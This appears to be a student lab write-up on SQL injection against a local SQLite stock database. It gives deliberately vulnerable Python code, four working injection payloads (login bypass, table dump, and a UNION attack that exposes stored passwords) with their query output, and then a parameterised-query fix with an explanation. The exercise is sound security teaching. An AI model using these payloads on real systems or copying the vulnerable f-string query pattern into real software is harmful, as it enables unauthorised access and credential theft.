TASK 3 - The Vulnerable Search 

--- Full vulnerable.py code ---

import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'Query: {query}')
    rows = conn.execute(query).fetchall()
    print(f'Result: {rows}\n')
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'Query: {query}')
    row = conn.execute(query).fetchone()
    print(f'Result: {row}\n')
    return row

search_product("' OR 1=1--")
login("admin'--", "anything")
login("' OR '1'='1", "' OR '1'='1")
search_product("' UNION SELECT id, username, password, role FROM users--")

--- Attack 1: Dump all products ---
Payload: search_product("' OR 1=1--")

Exact query printed by terminal:
  Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'

Result:
  [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0),
   (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0),
   (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
   (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
   (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]

Why it worked: The single quote closes the LIKE string early, then OR 1=1 is
always true so the WHERE clause never filters anything, and -- comments out the
rest of the SQL, returning every product in the table.


--- Attack 2: Login bypass with no password ---
Payload: login("admin'--", "anything")

Exact query printed by terminal:
  Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'

Result:
  (1, 'admin', 'admin123', 'admin')

Why it worked: The single quote after 'admin' closes the username string, and
the -- comments out the entire password check, so the database logs in as admin
without verifying any password at all.

Screenshot: screenshots/task3_attack2.png

--- Attack 3: Always-true login ---
Payload: login("' OR '1'='1", "' OR '1'='1")

Exact query printed by terminal:
  Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'

Result:
  (1, 'admin', 'admin123', 'admin')

Why it worked: The OR '1'='1' condition is always true, so the WHERE clause
matches every row in the users table and returns the first user (admin) with no
valid credentials at all.

Screenshot: screenshots/task3_attack3.png

--- Attack 4: UNION attack - steal user data through product search ---
Payload: search_product("' UNION SELECT id, username, password, role FROM users--")

Exact query printed by terminal:
  Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'

Result:
  [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0),
   (1, 'admin', 'admin123', 'admin'),
   (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0),
   (2, 'fatuma', 'pass456', 'attendant'),
   (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
   (3, 'wasswa', 'pass789', 'manager'),
   (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
   (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]

Why it worked: The UNION keyword joins a second SELECT statement onto the
original query, and because both SELECT statements return 4 columns, the
database combines their results — exposing all usernames and passwords through
a product search box.

TASK 4 - Fix the Vulnerabilities

--- Full secure.py code ---

import sqlite3
conn = sqlite3.connect('nyondo_stock.db')

def search_product_safe(name):
    if not isinstance(name, str):
        print("Error: name must be a string")
        return None
    if len(name) < 2:
        print(f"Error: search term '{name}' is too short (minimum 2 characters)")
        return None
    if any(ch in name for ch in ['<', '>', ';']):
        print(f"Error: search term contains forbidden characters (< > ;)")
        return None
    query = 'SELECT * FROM products WHERE name LIKE ?'
    rows = conn.execute(query, (f'%{name}%',)).fetchall()
    print(f'Result: {rows}')
    return rows

def login_safe(username, password):
    if not isinstance(username, str) or not username:
        print("Error: username must be a non-empty string")
        return None
    if ' ' in username:
        print(f"Error: username '{username}' must not contain spaces")
        return None
    if not isinstance(password, str) or len(password) < 6:
        print(f"Error: password must be at least 6 characters long")
        return None
    query = 'SELECT * FROM users WHERE username=? AND password=?'
    row = conn.execute(query, (username, password)).fetchone()
    print(f'Result: {row}')
    return row

print('Test 1:', search_product_safe("' OR 1=1--"))
print('Test 2:', search_product_safe("' UNION SELECT id,username,password,role FROM users--"))
print('Test 3:', login_safe("admin'--", 'anything'))
print('Test 4:', login_safe("' OR '1'='1", "' OR '1'='1"))

--- Explanation: Why does using ? prevent SQL injection? ---

When you use an f-string to build a SQL query, the user's input is pasted
directly into the SQL text before it is sent to the database engine, which
means the database cannot tell the difference between the developer's SQL and
the attacker's injected commands — they all arrive as one string of SQL.
With a parameterised query, the ? is a placeholder: Python sends the SQL
template and the user's data separately to the database, so the engine
receives them as two distinct things — it treats the data strictly as a value
to compare, never as SQL to execute. Even if an attacker types ' OR 1=1--, the
database engine sees it as the literal string ' OR 1=1-- being searched for,
not as SQL logic, so the attack is completely neutralised.
